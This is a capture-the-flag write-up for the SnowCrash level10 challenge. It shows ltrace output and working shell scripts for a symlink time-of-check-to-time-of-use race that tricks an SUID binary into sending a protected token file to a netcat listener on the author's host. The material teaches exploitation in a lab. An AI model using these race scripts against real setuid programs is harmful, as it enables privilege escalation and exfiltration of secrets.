## level10
These are the files we got this time

```bash
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

The binary asks for a file to send to a host.

If I create a file I have access to and `ltrace` what the binary does

 

```bash
level10@SnowCrash:~$ echo "hello world" > /tmp/myfile
level10@SnowCrash:~$ ltrace ./level10 /tmp/myfile 192.168.69.1
__libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/myfile", 4)                                                                                                      = 0
printf("Connecting to %s:6969 .. ", "192.168.69.1")                                                                           = 35
fflush(0xb7fd1a20Connecting to 192.168.69.1:6969 .. )                                                                                                            = 0
socket(2, 1, 0)                                                                                                               = 3
inet_addr("192.168.69.1")                                                                                                     = 0x0145a8c0
htons(6969, 1, 0, 0, 0)                                                                                                       = 14619
connect(3, 0xbffff6dc, 16, 0, 0)                                                                                              = -1
printf("Unable to connect to host %s\n", "192.168.69.1"Unable to connect to host 192.168.69.1
)                                                                      = 39
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

I see that it tries to connect to the port 6969 of the host I give it. So if I’d put my host in listening mode on that port I should be able to receive.

```bash
# On host I get the IP with ifconfig then
nc -l 6969
# ... and it hangs listening

# On guest
level10@SnowCrash:~$ ./level10 /tmp/myfile 192.168.69.1
Connecting to 192.168.69.1:6969 .. Connected!
Sending file .. wrote file!

# On host
.*( )*.
hello world
```

Since the SUID bit in the permissions is on I’d wrongly expect `level10` to run ad `flag10` and thus be able to send the token, but I get

```bash
level10@SnowCrash:~$ ./level10 token 192.168.69.1
You don't have access to token
```

I need to somehow escalate privileges. I see from `ltrace` that is the failed `access` command to prevent me to get what I want.

<aside>
💡

From `man access`

NOTES
Warning:  Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short
time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just  described,  a  safer  alternative
would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

</aside>

Ok… so my file should change between the moment it’s checked and the moment it’s opened. But how???

[Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)

I’ll write scripts that will do the things in an uncoordinated fashion so that statistically it will happen to hit the spot: the `access` check will be performed on a file and the `open` on another one.

```bash
#!/bin/bash
# Switching constantly a symlink between a file I own and the one I want 
while true
        do
                echo "MYFILE"
                ln -sf /tmp/myfile /tmp/token
                echo "TOKEN"
                ln -sf /home/user/level10/token /tmp/token
        done
```

```bash
#!/bin/bash
# Calling the program over and over
while true
        do
                /home/user/level10/level10 /tmp/token 192.168.69.1
        done
```

```bash
# On the host
nc -lk 6969 # -k keeps the connection open after transmission
```

Make them executable with `chmod +x` and spinning them all together: 

The token will be captured by the host and then we'll be able to log in as flag10 and get the flag.
